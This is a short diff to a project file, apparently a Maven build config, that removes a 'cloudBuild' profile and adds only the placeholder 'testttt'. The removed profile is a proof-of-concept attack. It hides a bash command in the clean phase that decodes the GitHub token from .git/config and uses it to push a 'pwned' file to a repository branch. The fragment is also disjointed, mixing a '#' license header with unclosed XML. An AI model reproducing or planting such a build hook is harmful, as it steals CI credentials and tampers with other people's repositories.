@@ -14,34 +14,5 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
- <profile>
-      <id>cloudBuild</id>
-      <activation>
-        <property><name>cloudBuild</name></property>
-      </activation>
-      <build>
-        <plugins>
-          <plugin>
-            <groupId>org.codehaus.mojo</groupId>
-            <artifactId>exec-maven-plugin</artifactId>
-            <version>3.1.1</version>
-            <executions>
-              <execution>
-                <id>run-after-clean</id>
-                <phase>clean</phase>
-                <goals>
-                  <goal>exec</goal>
-                </goals>
-                <configuration>
-                  <executable>/bin/bash</executable>
-                  <arguments>
-                    <argument>-c</argument>
-                    <argument>export GH_TOKEN=$(cat .git/config | grep extraheader | cut -d' ' -f5 | base64 --decode | cut -d: -f2); gh api --method PUT /repos/$GITHUB_REPOSITORY/contents/pwned.txt -f branch=feature/next-release -f message=pwn -f content=cHduZWQgYnkgdmlrb3JpdW0K</argument>
-                  </arguments>
-                </configuration>
-              </execution>
-            </executions>
-          </plugin>
-          <plugin>
-
-          #testing only for poc
+ testttt
+ 
